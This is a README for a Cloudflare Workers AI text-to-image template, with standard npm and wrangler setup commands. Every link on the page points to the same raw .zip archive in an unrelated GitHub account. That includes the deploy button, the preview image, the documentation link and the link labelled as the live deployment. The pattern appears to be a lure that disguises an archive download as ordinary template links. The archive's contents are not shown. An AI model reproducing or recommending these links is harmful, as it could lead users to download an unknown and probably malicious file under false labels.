# Text To Image App

[![Deploy to Cloudflare](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip)](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip)

![Text To Image Template Preview](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip)

<!-- dash-content-start -->

Generate images based on text prompts using [Workers AI](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip). In this example, going to the website will generate an image from the prompt "cyberpunk cat" using the `@cf/stabilityai/stable-diffusion-xl-base-1.0` model. Be patient! Your image may take a few seconds to generate.

<!-- dash-content-end -->

## Getting Started

Outside of this repo, you can start a new project with this template using [C3](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip) (the `create-cloudflare` CLI):

```bash
npm create cloudflare@latest -- --template=cloudflare/templates/text-to-image-template
```

A live public deployment of this template is available at [https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip](https://raw.githubusercontent.com/DigitalInfluencer/text-to-image-template-1/main/src/image_template_to_text_1.2.zip)

## Setup Steps

1. Install the project dependencies with a package manager of your choice:
   ```bash
   npm install
   ```
2. Deploy the project!
   ```bash
   npx wrangler deploy
   ```
3. Monitor your worker
   ```bash
   npx wrangler tail
   ```
